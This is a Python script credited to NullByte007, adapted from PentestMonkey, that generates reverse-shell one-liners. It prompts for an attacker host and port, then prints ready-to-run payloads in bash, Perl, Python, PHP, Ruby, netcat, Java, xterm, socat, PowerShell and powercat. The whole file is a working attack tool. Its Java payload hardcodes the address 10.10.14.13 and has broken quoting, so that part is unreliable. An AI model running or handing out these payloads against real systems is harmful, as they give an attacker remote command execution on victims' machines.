"""
Date: 16 May 2021
Reverse Shell Source : PentestMonkey
Source site : pentestmonkey.net
"""
import os

banner ="""
|=======================================================|
|   ██████╗ ███████╗██╗   ██╗	      ███████╗██╗  ██╗  |     
|   ██╔══██╗██╔════╝██║   ██║	      ██╔════╝██║  ██║  |   
|   ██████╔╝█████╗  ██║   ██║ ██████  ███████╗███████║  |   
|   ██╔══██╗██╔══╝  ╚██╗ ██╔╝	      ╚════██║██╔══██║  |   
|   ██║  ██║███████╗ ╚████╔╝ 	      ███████║██║  ██║  |   
|   ╚═╝  ╚═╝╚══════╝  ╚═══╝  	      ╚══════╝╚═╝  ╚═╝  |
|=======================================================|
| Code by : \033[30;42m NullByte007 [Aniket Nitin Bhagwate] \033[m       |
|=======================================================|
| Github : https://github.com/NullByte007               |
|=======================================================|
"""

menu_banner="""
|=======================================|
|                   MENU                |
|=======================================|
| \033[30;42m[1] BASH \033[m  | \033[30;42m[2] Perl \033[m  | \033[30;42m[3] Python \033[m |
|=======================================|
| \033[30;42m[4] PHP \033[m   | \033[30;42m[5] Ruby \033[m  | \033[30;42m[6] Netcat \033[m |
|=======================================|
| \033[30;42m[7] JAVA \033[m  | \033[30;42m[8] XTerm \033[m | \033[30;42m[9] Socat \033[m  |             
|=======================================|
| \033[30;42m[10] Powershell \033[m | \033[30;42m[11] Powercat \033[m     |
|=======================================|
"""

def shell_creater(lhost,lport,choice):
    os.system("clear")
    print(banner)

    print("\033[30;42;5m [#] REVERSE SHELL => \033[m \n")

    def bash(lhost,lport):
        print("\033[30;42m bash -i >& /dev/tcp/{}/{} 0>&1 \033[m".format(lhost,lport))
    
    def perl(lhost,lport):
        print("\033[30;42m perl -e 'use Socket;$i=" + '"' + lhost + '"' + ";$p=" + lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(" + '"' + "tcp" + '"' + "));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN," + '"' + ">&S" + '"' + ");open(STDOUT," + '"' + ">&S" + '"' + ");open(STDERR," + '"' + ">&S" + '"' + ");exec(" + '"' + "/bin/sh -i" + '"' + ");};' \033[m")

    def python(lhost,lport):
        print("\033[30;42m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + '"' + lhost + '"' + "," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([" + '"' + "/bin/sh" + '"' + "," + '"' + "-i" + '"' + "]);' \033[m")
    
    def php(lhost,lport):
        print("\033[30;42m php -r '$sock=fsockopen("+'"'+lhost + '"' + "," + lport + ");exec(" + '"' "/bin/sh -i <&3 >&3 2>&3" +'"' + ");') \033[m")

    def ruby(lhost,lport):
        print("\033[30;42m ruby -rsocket -e'f=TCPSocket.open(" + '"' + lhost + '"' + "," + lport + ").to_i;exec sprintf(" + '"' + "/bin/sh -i <&%d >&%d 2>&%d" + '"' + ",f,f,f)' \033[m")

    def netcat(lhost,lport):
        print("\033[30;42m nc -e /bin/sh {} {} \033[m \n".format(lhost,lport))
        print("\033[30;42m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f \033[m".format(lhost,lport))

    def java(lhost,lport):
        print("\033[30;42m r = Runtime.getRuntime()" + "\n" +"p = r.exec(["+'"'+"/bin/bash"+'"'+ ","+'"' + "-c" '"' + ","+'"'+"exec 5<>/dev/tcp/10.10.14.13/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done" + '"' + "] as String[])"+"\n" + "p.waitFor() \033[m")

    def xterm(lhost,lport):
        print("\033[30;42m xterm -display {}:{} \033[m".format(lhost,lport))

    def socat(lhost,lport):
        print("\033[30;42m socat TCP4:{}:{} EXEC:/bin/bash \033[m".format(lhost,lport))

    def powershell(lhost,lport):
        print("\033[30;42m powershell -c "+'"'+"$client = New-Object System.Net.Sockets.TCPClient('"+lhost + "'" + "," + lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"+'" \033[m ')

    def powercat(lhost,lport):
        print("\033[30;42m powercat -c {} -p {}  -e /bin/bash \033[m".format(lhost,lport)) 

    shell_type={"1": bash, "2" : perl, "3" : python, "4" : php, "5" : ruby, "6" : netcat, "7" : java, "8" : xterm, "9" : socat, "10" : powershell, "11" : powercat}
    shell_type[choice](lhost,lport)
    print("\n")


def main():
    print(banner)
    lhost = input("[!] ENTER LHOST : ")
    lport = input("[!] ENTER LPORT : ")
    print(menu_banner)
    choice = input("[!] SELECT SHELL TYPE : ")
    shell_creater(lhost,lport,choice)

if __name__=="__main__":
    main()